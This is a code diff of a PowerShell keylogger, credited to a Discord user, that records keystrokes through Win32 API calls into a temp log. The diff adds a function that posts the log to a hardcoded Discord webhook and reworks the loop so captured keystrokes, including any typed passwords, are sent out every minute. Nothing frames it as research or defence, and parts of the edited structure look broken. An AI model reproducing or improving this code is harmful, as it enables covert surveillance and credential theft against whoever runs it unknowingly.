@@ -1,8 +1,21 @@
 # MADE BY SYKE
 # Discord: syke#1166 / Syke#1166
 
+ 
+ $generateLog = New-Item -Path $env:temp/keylogger.log -ItemType File -Force
+
+ function Webhook($webhookUri = 'https://discord.com/api/webhooks/941322499986190466/ehCY6Aczy1BD39n5ukLpXrfg45vGb8qWYoWUr3_l3EBTJenVuVevW21gprFZC4_F4Y87'){
+     
+    $Body = @{
+  
+        'content' = get-content $env:temp/keylogger.log
+        }
+      Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+     }
+
+
 # keylogger
-function KeyLogger($logFile="$env:temp/keylogger.log") {
+function Keylogger($logFile="$env:temp/keylogger.log") {
 
 
    # Signatures for API Calls
@@ -17,13 +30,13 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-  # load signatures and make members available
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-    
-    $generateLog = New-Item -Path $logFile -ItemType File -Force
+
+
+   # generate log file
+ 
   
-  try{
-    while ($true) {
+
 
       Start-Sleep -Milliseconds 40
       
@@ -58,22 +71,25 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           
         }
       }
+      
     }
-  }
-
-  finally {
     
-        
-     $webhookUri = 'https://discord.com/api/webhooks/941322499986190466/ehCY6Aczy1BD39n5ukLpXrfg45vGb8qWYoWUr3_l3EBTJenVuVevW21gprFZC4_F4Y87'
-    $Body = @{
-  
-        'content' = get-content $env:temp/keylogger.log
-        }
-      Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+     $time = Get-Date -Format mm
+     
+     
 
-  }
-}
+      while($true)
+     {
+     Keylogger
+     $time2 = Get-Date -Format mm
+     if($time -ne $time2)
+     {
+         
+         Webhook
+         $time = $time2
+      }
 
+    
+     
+     }
 
-# run keylogger
-KeyLogger
